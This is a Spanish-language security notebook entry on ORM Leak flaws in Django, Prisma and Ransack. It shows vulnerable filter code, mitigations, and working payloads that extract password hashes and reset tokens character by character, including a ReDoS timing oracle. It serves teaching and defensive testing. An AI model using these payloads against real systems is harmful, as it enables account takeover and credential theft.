---
tags:
  - seguridad-web
  - owasp
  - orm-leak
aliases:
  - ORM Leak
  - Fuga de datos por ORM
---

# ORM Leak

**Un ORM Leak ocurre cuando la aplicación pasa entrada del usuario directamente como filtros de una consulta ORM, permitiendo filtrar por campos sensibles que nunca debían exponerse** (contraseñas, tokens de recuperación, hashes). Combinado con operadores de coincidencia parcial, se extrae el valor carácter a carácter.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Frameworks como Django, Prisma o Ransack construyen consultas a partir de claves dinámicas. Si esas claves provienen del usuario sin lista de permitidos, el atacante elige la columna a filtrar e incluso navega relaciones (uno-a-uno, muchos-a-muchos) hasta llegar a campos privados. Usando operadores como `startswith`/`contains` se confirma cada carácter por el comportamiento de la respuesta (booleano o por tiempo).

## Detección y pruebas
Busca endpoints que reciben objetos de filtro arbitrarios:

```python
users = User.objects.filter(**request.data)   # Django: vulnerable
```

```js
const posts = await prisma.article.findMany({ where: req.query.filter })  // Prisma: vulnerable
```

Prueba a inyectar sufijos de lookup y observa si cambia el resultado.

## Explotación / payloads
**Django** — filtrar por un campo privado con operadores de comparación:

```json
{ "username": "admin", "password__startswith": "p" }
```

**Django relacional** (navegar hasta el hash de otro usuario):

```json
{ "created_by__user__password__contains": "p" }
```

**Django error-based (ReDoS) en MySQL** — distingue verdadero/falso por timeout del regex:

```json
{ "created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$" }
```

**Prisma** — exponer campos vía `select`/`include`:

```json
{ "filter": { "select": { "createdBy": { "select": { "password": true } } } } }
```

**Ransack (Ruby < 4.0.0)** — exfiltrar token carácter a carácter:

```
GET /posts?q[user_reset_password_token_start]=2   -> hay resultados (acierto)
GET /posts?q[user_reset_password_token_start]=2f  -> hay resultados
```

## Mitigación
- Nunca pasar entrada del usuario directamente como filtros (`**request.data`, `where: req.query`).
- Aplicar **listas de permitidos** explícitas de campos y operadores filtrables.
- Serializar la salida con esquemas que excluyan campos sensibles; separar modelos de lectura de los de almacenamiento.
- Mantener actualizado el ORM (Ransack >= 4.0.0) y monitorizar consultas anómalas o lentas (ReDoS).

## Herramientas
- **plormber** (elttam) — explotación de ORM Leak basados en tiempo.

---
🔗 Relacionado: [[IDOR]] · [[Mass Assignment]] · [[Parámetros ocultos]]
📚 Fuente: [PayloadsAllTheThings — ORM Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/ORM%20Leak) (MIT, © Swissky)
